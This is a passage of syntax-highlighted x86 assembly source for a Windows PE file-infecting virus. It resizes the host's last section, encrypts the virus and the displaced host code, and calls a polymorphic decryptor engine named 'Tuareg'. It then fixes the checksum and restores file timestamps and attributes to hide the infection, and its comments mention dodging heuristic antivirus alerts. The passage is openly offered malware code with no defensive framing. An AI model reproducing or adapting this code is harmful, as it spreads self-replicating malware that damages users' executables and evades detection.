  </span><span class="sc5">@@SizeIsOK_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Calculate new virtual total size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc1">;  add     ebx, 1000h      ; Add 1000h to be sure...</span><span class="sc0">
              </span><span class="sc1">; Removed due to heuristic alert (virtual end of last section</span><span class="sc0">
              </span><span class="sc1">; must coincide with virtual end of whole executable).</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; ...and put it on its header field</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Host_Data_Size</span><span class="sc0">  </span><span class="sc1">; Check now the</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">; physical size</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@SizeIsOK_2</span><span class="sc0">
 </span><span class="sc5">@@SizeIsNotOK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Calculate the new physical size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; of the last section and of all the</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; file. If the last section is the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; .reloc and it's big enough to hold</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; the virus (Virus_Size +</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">; Host_Data_Size), then the file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">          </span><span class="sc1">; doesn't grow in size.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RemainderIs0</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">@@RemainderIs0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeLow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapFile</span><span class="sc0">        </span><span class="sc1">; Close this mapping</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">          </span><span class="sc1">; Open a mapping with the new size</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@End3</span><span class="sc0">
       </span><span class="sc1">; Here, the file is prepared to hold the virus</span><span class="sc0">
  </span><span class="sc5">@@SizeIsOK_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; This operations are made coz</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">; maybe the mapping address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEHeaderAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc1">; changed when resizing.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">           </span><span class="sc1">; EAX=Address of .text header (map)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; New entrypoint of the executable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; is the starting address of .text</span><span class="sc0">
                                           </span><span class="sc1">; virtually</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Add the base address of exec...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RestoreAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; ...and we have the virtual</span><span class="sc0">
                                                  </span><span class="sc1">; address of text. We have</span><span class="sc0">
                                                  </span><span class="sc1">; to restore the host here.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SizeOfText</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the physical address of the</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; section in ECX</span><span class="sc0">

                                             
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; EAX=Phys. address of last sec. head.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A0000020h</span><span class="sc0"> </span><span class="sc1">; Make it EXECUTABLE/</span><span class="sc0">
                                                        </span><span class="sc1">; /WRITABLE/READABLE</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ConstructNameForReloc</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; EAX=Mapping address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDI=Physical address of the last</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; section inside the executable, now</span><span class="sc0">
                                       </span><span class="sc1">; mapped</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CalculateAPIsAddresses</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">   </span><span class="sc1">; EAX=Random value, and one of the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptValue2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; the virus will be</span><span class="sc0">
                                                         </span><span class="sc1">; crypted with</span><span class="sc0">

      </span><span class="sc1">;; This function creates a new decryptor at the beginning of the virus,</span><span class="sc0">
      </span><span class="sc1">;; but with a normal polymorphism level. This avoids cryptanalisis and</span><span class="sc0">
      </span><span class="sc1">;; all that.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyDumbDecryptor</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; ESI=Virus start</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Inic_Virus</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; Errrmh... size in dwords, maybe?</span><span class="sc0">
                                            </span><span class="sc1">; :)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyingVirus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; This controls the</span><span class="sc0">
                                                </span><span class="sc1">; first 3Ch bytes, to check</span><span class="sc0">
                                                </span><span class="sc1">; if we have to encrypt with</span><span class="sc0">
                                                </span><span class="sc1">; one or two encryption keys</span><span class="sc0">
                                                </span><span class="sc1">; (the first 3Ch bytes are the</span><span class="sc0">
                                                </span><span class="sc1">; little decryptor)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptWhileStoring</span><span class="sc0">  </span><span class="sc1">; OK, so that</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ESI=Host code address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Host_Data_Size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CopyingVirus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptWhileStoring</span><span class="sc0">       </span><span class="sc1">; Store the overwritten data</span><span class="sc0">
                                                  </span><span class="sc1">; of the host encrypting it</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Host_Data_Size</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JumpFillSection_002</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@JumpFillSection_001</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
     </span><span class="sc5">@@JumpFillSection_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@LoopFillSection_001</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@LoopFillSection_001</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@JumpFillSection_002</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
     </span><span class="sc5">@@JumpFillSection_002</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EBX=Virtual address where the de-</span><span class="sc0">
                                         </span><span class="sc1">; cryptor will be</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; ECX=Physical place where the de-</span><span class="sc0">
                                         </span><span class="sc1">; cryptor will be constructed</span><span class="sc0">
                  
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RelocHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; EAX=Displacement from the decryptor</span><span class="sc0">
                                         </span><span class="sc1">; start until the encrypted part. I</span><span class="sc0">
                                         </span><span class="sc1">; use this to calculate the final</span><span class="sc0">
                                         </span><span class="sc1">; jump to the decrypted part</span><span class="sc0">

               </span><span class="sc1">; EAX=Displacement from the beginning till the virus</span><span class="sc0">
               </span><span class="sc1">; EBX=Virtual address where the decryptors will be</span><span class="sc0">
               </span><span class="sc1">; ECX=Place where the decryptors must be put</span><span class="sc0">
               </span><span class="sc1">; Size of encrypted part is always Virus_SizePOW2</span><span class="sc0">

                </span><span class="sc1">; int 3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Tuareg</span><span class="sc0">      </span><span class="sc1">; Call this amazing engine! :)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EPAddition</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc1">; Let's calculate the checksum for the header address (if it's</span><span class="sc0">
            </span><span class="sc1">; different from 0)</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CheckSumMappedFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End4</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TextHeader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Buffer variable</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CheckSumMappedFile</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc5">@@End4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UnmapFile</span><span class="sc0">       </span><span class="sc1">; Believe me, you'll miss these faci-</span><span class="sc0">
       </span><span class="sc5">@@End3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreDateTime</span><span class="sc0"> </span><span class="sc1">; lities to understand the code when</span><span class="sc0">
                                        </span><span class="sc1">; you look the code of TUAREG :P</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CloseHandle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close file</span><span class="sc0">

       </span><span class="sc5">@@End2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileAttributes</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileName</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; Restore file attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
